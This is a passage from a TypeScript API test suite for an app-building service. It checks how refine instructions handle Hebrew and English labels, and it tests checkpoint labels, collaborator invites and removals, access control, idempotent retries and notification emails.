 * established description with brand-new text (the instruction, a
 * clarifying-question answer) -- and both used to run isHebrewText on that
 * WHOLE combined string. A single Hebrew word anywhere in the new text
 * alone (a pasted name, a stray word) flipped an already-English, already-
 * built project's ENTIRE set of entity/field labels to Hebrew, not just
 * whatever the instruction was actually about -- a real, visible regression
 * on a live app. Confirms a refine instruction containing one Hebrew word
 * leaves the project's own already-English Customer label alone.
 */
test("POST /refine with an instruction containing a single Hebrew word does not flip the whole project's labels to Hebrew", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "Build a CRM to track customers and their orders for my shop.",
      }),
    });
    assert.equal(createRes.status, 201);
    const created = (await createRes.json()) as { project: { id: string }; providerName: string };
    assert.equal(created.providerName, "heuristic");
    const projectId = created.project.id;

    const buildRes = await fetch(`${baseUrl}/api/projects/${projectId}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    await collectSSE(buildRes);

    // "דנה" (a Hebrew name) is the one Hebrew word in an otherwise-English
    // instruction -- exactly the kind of stray text that used to flip
    // isHebrewText(combinedDescription) to true for the whole regenerated
    // spec.
    const refineRes = await fetch(`${baseUrl}/api/projects/${projectId}/refine`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ instruction: "Add a note field for the customer's account manager, דנה." }),
    });
    assert.equal(refineRes.status, 200);
    const refineEvents = await collectSSE(refineRes);
    assert.ok(refineEvents.every((e) => e.status !== "failed"), "refine should succeed on valid input");
    const refineFinal = refineEvents[refineEvents.length - 1];
    const refinedProject = (refineFinal.detail as { project: { spec: { entities: { name: string; label?: string }[] } } }).project;
    const customer = refinedProject.spec.entities.find((e) => e.name === "Customer");
    assert.ok(customer, "expected the original Customer entity to survive the refine");
    assert.ok(
      customer!.label === undefined || !/[֐-׿]/.test(customer!.label),
      `the project's own established English label must not flip to Hebrew from one stray Hebrew word in the new instruction alone -- got label "${customer!.label}"`,
    );
  });
});

/**
 * Round 709: round 708 (commit f52c1b7) fixed generateSpec's own language
 * decision to come from project.description alone, not the instruction --
 * but the checkpoint's own changeLabel, three lines below that fix, still
 * decided its Hebrew/English prefix from isHebrewText(instruction), the
 * brand-new instruction's own text, never touched by round 708 since it
 * isn't part of spec generation. A Hebrew project refined with a plain-
 * English instruction got one inconsistently-English entry ("Refine: ...")
 * in an otherwise fully-Hebrew Time Machine checkpoint list -- the exact
 * same root-cause shape (deciding a language-sensitive label from the
 * wrong, non-authoritative text) as round 708, just a different field.
 * Confirms the checkpoint label now matches /build's own identical
 * isHebrewText(project.description) convention, regardless of which
 * script the instruction itself happens to use.
 */
test("POST /refine on a Hebrew project with a plain-English instruction still labels the checkpoint in Hebrew, matching every other checkpoint", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "אפליקציה לניהול לקוחות והזמנות לחנות שלי.",
      }),
    });
    assert.equal(createRes.status, 201);
    const created = (await createRes.json()) as { project: { id: string }; providerName: string };
    const projectId = created.project.id;

    const buildRes = await fetch(`${baseUrl}/api/projects/${projectId}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    await collectSSE(buildRes);

    const refineRes = await fetch(`${baseUrl}/api/projects/${projectId}/refine`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ instruction: "Add email field" }),
    });
    assert.equal(refineRes.status, 200);
    const refineEvents = await collectSSE(refineRes);
    assert.ok(refineEvents.every((e) => e.status !== "failed"), "refine should succeed on valid input");

    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints`, {
      headers: authHeaders(token),
    });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { label: string }[] };
    const refineCheckpoint = checkpoints.find((c) => c.label.includes("Add email field"));
    assert.ok(refineCheckpoint, "expected a checkpoint for the refine");
    assert.match(
      refineCheckpoint!.label,
      /^שיפור: /,
      `a Hebrew project's checkpoint must stay labeled in Hebrew regardless of which script the refine instruction itself used -- got "${refineCheckpoint!.label}"`,
    );
  });
});

/**
 * Round 938: RefineSchema's own `instruction` field was the one free-text
 * schema in this file missing `.trim()` -- every sibling
 * (description/idea/name/label/role/assumption/persona, round 919's own
 * idea fix) already has it. A stray leading/trailing space the client
 * sent (e.g. via the live preview's own refine box, where refineText
 * isn't trimmed before the network call) reached this route's permanent
 * checkpoint changeLabel verbatim, stored forever in the Time Machine
 * history with a visible stray space.
 */
test("POST /refine trims a leading/trailing space from the instruction before baking it into the permanent checkpoint label", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM to track customers and their orders for my shop." }),
    });
    assert.equal(createRes.status, 201);
    const created = (await createRes.json()) as { project: { id: string } };
    const projectId = created.project.id;

    const buildRes = await fetch(`${baseUrl}/api/projects/${projectId}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    await collectSSE(buildRes);

    const refineRes = await fetch(`${baseUrl}/api/projects/${projectId}/refine`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ instruction: "  fix the invoice total  " }),
    });
    assert.equal(refineRes.status, 200);
    const refineEvents = await collectSSE(refineRes);
    assert.ok(refineEvents.every((e) => e.status !== "failed"), "refine should succeed on valid input");

    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints`, {
      headers: authHeaders(token),
    });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { label: string }[] };
    const refineCheckpoint = checkpoints.find((c) => c.label.includes("fix the invoice total"));
    assert.ok(refineCheckpoint, "expected a checkpoint for the refine");
    assert.equal(
      refineCheckpoint!.label,
      "Refine: fix the invoice total",
      `the stray leading/trailing space must never reach the permanent checkpoint label -- got "${refineCheckpoint!.label}"`,
    );
  });
});

test("POST /build a second time on an already-built project is rejected, instead of silently inserting a second checkpoint mislabeled 'Initial build'", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const firstBuildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(firstBuildRes.status, 200);
    await collectSSE(firstBuildRes);

    const secondBuildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(secondBuildRes.status, 409);
    assert.equal(((await secondBuildRes.json()) as { code?: string }).code, "ALREADY_BUILT");

    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, {
      headers: authHeaders(token),
    });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { label: string }[] };
    assert.deepEqual(
      checkpoints.map((c) => c.label),
      ["Initial build"],
      "the rejected second build must not have inserted another checkpoint",
    );
  });
});

test("POST /answers on an already-built project is rejected, instead of silently desyncing the stored spec from the actual built schema", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    await collectSSE(buildRes);

    const answersRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ additionalRequest: "Also track invoices for customers." }),
    });
    assert.equal(answersRes.status, 409);
    assert.equal(((await answersRes.json()) as { code?: string }).code, "ALREADY_BUILT");

    // The stored spec must be completely untouched by the rejected call --
    // no "Invoice" entity that has no real table behind it.
    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchangedProject } = (await getRes.json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    assert.deepEqual(unchangedProject.spec.entities.map((e) => e.name).sort(), ["Customer", "Deal"]);
  });
});

test("a second user cannot see or act on the first user's project", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner@example.com");
    const intruderToken = await signup(baseUrl, "intruder@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const getAsIntruder = await fetch(`${baseUrl}/api/projects/${project.id}`, {
      headers: authHeaders(intruderToken),
    });
    assert.equal(getAsIntruder.status, 404);

    const listAsIntruder = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(intruderToken) });
    const { projects } = (await listAsIntruder.json()) as { projects: unknown[] };
    assert.equal(projects.length, 0);
  });
});

test("the project owner can invite an existing user as a collaborator, and the collaborator immediately gains full access", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab1@example.com");
    const collabToken = await signup(baseUrl, "collab1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    // Before being invited, this is exactly the "second user" case above.
    const beforeInvite = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
    assert.equal(beforeInvite.status, 404);

    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab1@example.com" }),
    });
    assert.equal(inviteRes.status, 201);
    const { collaborators } = (await inviteRes.json()) as { collaborators: { email: string }[] };
    assert.deepEqual(
      collaborators.map((c) => c.email),
      ["collab1@example.com"],
    );

    const afterInvite = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
    assert.equal(afterInvite.status, 200);

    // The invited user's own project list now includes it too, alongside (not instead of) their own owned projects.
    const listRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(collabToken) });
    const { projects } = (await listRes.json()) as { projects: { id: string }[] };
    assert.deepEqual(
      projects.map((p) => p.id),
      [project.id],
    );
  });
});

/**
 * Regression test for a real bug found by this round's Explore survey:
 * every stored account email is lowercased at signup (see auth.ts's
 * CredentialsSchema), but the collaborator-invite lookup never applied the
 * same normalization before its exact-case SQL match -- so typing an
 * existing account's email with any different capitalization (mobile
 * auto-capitalize, pasting from an email signature, "John.Doe@Company.com")
 * made a real, existing account invisible to this endpoint and threw a
 * false "No account found" 404, even though the account genuinely exists.
 */
test("inviting a collaborator by email works regardless of the typed capitalization, since account emails are stored lowercase", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab-case@example.com");
    await signup(baseUrl, "collab-case@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "Collab-Case@Example.com" }),
    });
    assert.equal(inviteRes.status, 201, "a real, existing account must be found regardless of typed capitalization");
    const { collaborators } = (await inviteRes.json()) as { collaborators: { email: string }[] };
    assert.deepEqual(
      collaborators.map((c) => c.email),
      ["collab-case@example.com"],
      "the collaborator's email should be stored/returned in its real, lowercase form -- not the differently-cased typed input",
    );
  });
});

/**
 * Round 1253: this route used to send no notification anywhere once the
 * invite succeeded, the one gap `sharedProjectSeen.ts`'s own round-401 doc
 * comment named explicitly ("a collaborator invite ... has no email, no
 * desktop notification, and no 'new' marker of any kind") and left open
 * only pending real email infrastructure -- infra that now exists and
 * already notifies on login-code, forgot-password, change-email (round
 * 1206), and change-password (round 1252). Confirms the real
 * EmailSender.send call reaches the INVITED user's own address, naming the
 * project and role.
 */
test("inviting a collaborator sends a real notification to the invited user, naming the project and role, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-collab-notify-${Date.now()}@example.com`);
      const invitedEmail = `collab-notify-${Date.now()}@example.com`;
      await signup(baseUrl, invitedEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: invitedEmail, role: "viewer", lang: "en" }),
      });
      assert.equal(inviteRes.status, 201);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, invitedEmail, "the notification must go to the INVITED user, not the owner who sent it");
      assert.match(emailSender.sentTo[0].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");
      assert.match(emailSender.sentTo[0].text, /view-only/, "the body must name the real role granted");
    },
    { emailSender },
  );
});

test("inviting a collaborator still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-collab-notify-unconfigured-${Date.now()}@example.com`);
      const invitedEmail = `collab-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, invitedEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: invitedEmail }),
      });
      assert.equal(inviteRes.status, 201, "the invite itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

/**
 * Round 1253: addCollaborator is deliberately idempotent (see
 * CollaboratorsPanel.tsx's own handleInvite comment) -- re-inviting
 * someone already on the project is a silent no-op server-side. Confirms
 * that no-op never fires a second, spurious notification.
 */
test("re-inviting an existing collaborator is a no-op that sends no notification", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-collab-notify-noop-${Date.now()}@example.com`);
      const invitedEmail = `collab-notify-noop-${Date.now()}@example.com`;
      await signup(baseUrl, invitedEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: invitedEmail }),
      });
      assert.equal(emailSender.sentTo.length, 1, "the first, genuine invite must send its own notification");

      const secondInviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: invitedEmail }),
      });
      assert.equal(secondInviteRes.status, 201);
      assert.equal(emailSender.sentTo.length, 1, "re-inviting an already-added collaborator is a no-op -- nothing new to notify them about");
    },
    { emailSender },
  );
});

test("the owner can remove a collaborator, which revokes their access again", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab2@example.com");
    const collabToken = await signup(baseUrl, "collab2@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab2@example.com" }),
    });
    const collabListRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      headers: authHeaders(ownerToken),
    });
    const { collaborators } = (await collabListRes.json()) as { collaborators: { userId: string }[] };
    const collabUserId = collaborators[0].userId;

    const removeRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(removeRes.status, 204);

    const afterRemove = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
    assert.equal(afterRemove.status, 404);
  });
});

/**
 * Round 1254: this route used to send no notification anywhere once a
 * collaborator was removed by the owner -- the same gap round 1254's own
 * role-change fix (above) just closed for a role change. Confirms the
 * real EmailSender.send call reaches the REMOVED collaborator, naming
 * the real project, and that the self-leave path never emails the
 * LEAVER themselves -- notifying someone of the thing they themselves
 * just asked to do is pure noise, not a signal.
 *
 * Round 1277: the self-leave path used to send no notification to
 * anyone at all, including the project owner -- the one remaining
 * silent direction of a collaborator-list change, unlike every other
 * direction (invite, role change, owner-removes-collaborator just
 * above, ownership transfer, project deletion), which already notifies
 * the affected party. Confirms a self-leave now sends exactly one real
 * notification, to the OWNER, naming both the project and the leaver.
 */
test("removing a collaborator sends a real notification to the REMOVED collaborator naming the project, and a self-initiated 'leave' notifies the OWNER instead", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerEmail = `owner-remove-notify-${Date.now()}@example.com`;
      const ownerToken = await signup(baseUrl, ownerEmail);
      const removedEmail = `collab-remove-notify-${Date.now()}@example.com`;
      await signup(baseUrl, removedEmail);
      const leaverEmail = `collab-leave-notify-${Date.now()}@example.com`;
      const leaverToken = await signup(baseUrl, leaverEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: removedEmail }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: leaverEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; email: string }[] };
      const removedUserId = collaborators.find((c) => c.email === removedEmail)!.userId;
      const leaverUserId = collaborators.find((c) => c.email === leaverEmail)!.userId;
      emailSender.sentTo.length = 0; // The two invites above (round 1253) also each send one -- only the removal sends matter here.

      const removeRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${removedUserId}?lang=en`, {
        method: "DELETE",
        headers: authHeaders(ownerToken),
      });
      assert.equal(removeRes.status, 204);
      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent for the owner-initiated removal");
      assert.equal(emailSender.sentTo[0].to, removedEmail, "the notification must go to the REMOVED collaborator");
      assert.match(emailSender.sentTo[0].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");

      const leaveRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${leaverUserId}?lang=en`, {
        method: "DELETE",
        headers: authHeaders(leaverToken),
      });
      assert.equal(leaveRes.status, 204);
      assert.equal(emailSender.sentTo.length, 2, "a self-initiated leave must send exactly one new notification");
      assert.equal(emailSender.sentTo[1].to, ownerEmail, "the self-leave's own notification must go to the project OWNER, not the leaver");
      assert.match(emailSender.sentTo[1].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");
      assert.match(emailSender.sentTo[1].text, new RegExp(leaverEmail.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the collaborator who left");

      // Round 1269: a second DELETE for the SAME already-removed
      // collaborator (e.g. two collaborator-panel tabs both showing the
      // same stale list) must still succeed as a no-op, but must never
      // send a second "you were removed" email -- the target is still a
      // real user (findUserById alone can't tell this apart from the
      // first, genuine removal), but they were already removed from this
      // project before this call even started.
      const removeAgainRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${removedUserId}?lang=en`, {
        method: "DELETE",
        headers: authHeaders(ownerToken),
      });
      assert.equal(removeAgainRes.status, 204, "removing an already-removed collaborator again must still succeed as a no-op");
      assert.equal(emailSender.sentTo.length, 2, "removing an already-removed collaborator again must never send a second notification");
    },
    { emailSender },
  );
});

test("a collaborator (not the owner) cannot invite or remove other collaborators", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab3@example.com");
    const collabToken = await signup(baseUrl, "collab3@example.com");
    await signup(baseUrl, "third-party@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab3@example.com" }),
    });

    // A collaborator has full read/write access to the project itself, but
    // managing who else has that access stays owner-only -- 404, the same
    // existence-hiding treatment as an outsider gets, not a 403.
    const inviteAsCollab = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ email: "third-party@example.com" }),
    });
    assert.equal(inviteAsCollab.status, 404);

    // Removing a DIFFERENT collaborator's own id stays blocked -- this is
    // now a real 403 (not the 404 above), since a collaborator DOES have
    // real access to this project (they just aren't allowed to remove
    // anyone but themselves); see the dedicated "leave project" tests below
    // for the one case this route now does allow.
    const removeAsCollab = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/anyone`, {
      method: "DELETE",
      headers: authHeaders(collabToken),
    });
    assert.equal(removeAsCollab.status, 403);
  });
});

/**
 * New in this round: a collaborator invited to someone else's project
 * previously had no way to actually leave it -- only the owner could
 * remove them. The DELETE .../collaborators/:userId route now also allows
 * removing YOURSELF (real, permanent "leave project" self-service, the
 * collaborator-scoped sibling of round 210's own "delete my account").
 * Confirms a collaborator can remove their own id and genuinely loses
 * access afterward, while the owner's own project (and any OTHER
 * collaborator on it) stays completely untouched.
 */
test("a collaborator can leave a project by removing their own id, losing access -- while the owner and any other collaborator are unaffected", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-leave1@example.com");
    const leavingToken = await signup(baseUrl, "leaving-collab1@example.com");
    const stayingToken = await signup(baseUrl, "staying-collab1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "leaving-collab1@example.com" }),
    });
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "staying-collab1@example.com" }),
    });

    const meRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(leavingToken) });
    const { user: leavingUser } = (await meRes.json()) as { user: { id: string } };

    const leaveRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${leavingUser.id}`, {
      method: "DELETE",
      headers: authHeaders(leavingToken),
    });
    assert.equal(leaveRes.status, 204);

    // The leaving collaborator has genuinely lost access.
    const afterLeave = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(leavingToken) });
    assert.equal(afterLeave.status, 404);

    // The owner's own project is completely untouched.
    const ownerAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    assert.equal(ownerAfter.status, 200);

    // The OTHER collaborator's own access is completely untouched.
    const stayingAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(stayingToken) });
    assert.equal(stayingAfter.status, 200, "a different collaborator's own access must be completely unaffected by someone else leaving");

    // The collaborator list itself no longer includes the one who left, but still includes the one who stayed.
    const collabListRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await collabListRes.json()) as { collaborators: { userId: string }[] };
    assert.ok(!collaborators.some((c) => c.userId === leavingUser.id));
    assert.equal(collaborators.length, 1);
  });
});

/**
 * Round 1191: this route's own self-leave path is a case docs/wakeRetry-
 * idempotency-design.md's standing inventory got wrong -- it classified
 * every DELETE route as "already safe" because deleting an already-
 * deleted row is a no-op, but that reasoning never checked the auth gate
 * (requireProjectAccess) that runs BEFORE the deletion. Once a self-leave
 * succeeds, the caller is no longer a collaborator (or the owner), so a
 * retry with no idempotency protection used to re-evaluate that same
 * check and 404 ("Project not found") for a leave that, from the
 * caller's own point of view, already fully succeeded. Same shape as
 * round 1189's transfer-ownership fix.
 */
test("DELETE .../collaborators/:userId (self-leave) retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing now that the caller is no longer a collaborator", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "leave-idem-owner1@example.com");
    const leavingToken = await signup(baseUrl, "leave-idem-collab1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "leave-idem-collab1@example.com" }),
    });
    const meRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(leavingToken) });
    const { user: leavingUser } = (await meRes.json()) as { user: { id: string } };

    const headers = { ...authHeaders(leavingToken), "x-idempotency-key": "self-leave-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${leavingUser.id}`, { method: "DELETE", headers });
    assert.equal(firstRes.status, 204);

    const afterFirst = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(leavingToken) });
    assert.equal(afterFirst.status, 404, "sanity check: the first call must have genuinely removed this account's own access");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${leavingUser.id}`, { method: "DELETE", headers });
    assert.equal(
      retryRes.status,
      204,
      "a retried self-leave with the same idempotency key must replay the original success, not 404 now that the caller is no longer a collaborator",
    );
  });
});

/**
 * The critical cross-collaborator check this project's established rule
 * (rounds 208-212) requires for any delete/update endpoint that accepts a
 * client-supplied id: a real id belonging to a DIFFERENT collaborator, not
 * a fake placeholder string. Confirms one collaborator can never remove
 * ANOTHER real collaborator's own access, only their own.
 */
test("a collaborator cannot remove a DIFFERENT real collaborator's own access, only their own", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-leave2@example.com");
    const collabAToken = await signup(baseUrl, "collab-a2@example.com");
    const collabBToken = await signup(baseUrl, "collab-b2@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab-a2@example.com" }),
    });
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab-b2@example.com" }),
    });

    const meBRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(collabBToken) });
    const { user: collabB } = (await meBRes.json()) as { user: { id: string } };

    const removeRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabB.id}`, {
      method: "DELETE",
      headers: authHeaders(collabAToken),
    });
    assert.equal(removeRes.status, 403);

    // Collaborator B's own access must be completely untouched.
    const stillHasAccess = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabBToken) });
    assert.equal(stillHasAccess.status, 200);
  });
});

/**
 * New in this round: listCollaborators (collaborators.ts) only ever
 * queries the project_collaborators join table -- the owner is never a
 * row in it (their access comes straight from project.ownerId), so a
 * collaborator opening the sharing panel could see every OTHER
 * collaborator but had no way to see who actually owned the project.
 * Both the GET list route and the POST invite route now also return an
 * `owner` object alongside `collaborators`, for both the owner's own
 * view and a collaborator's view.
 */
test("GET and POST /collaborators both return the real project owner's id and email, for the owner's own view", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab-info1@example.com");
    await signup(baseUrl, "collab-info1@example.com");

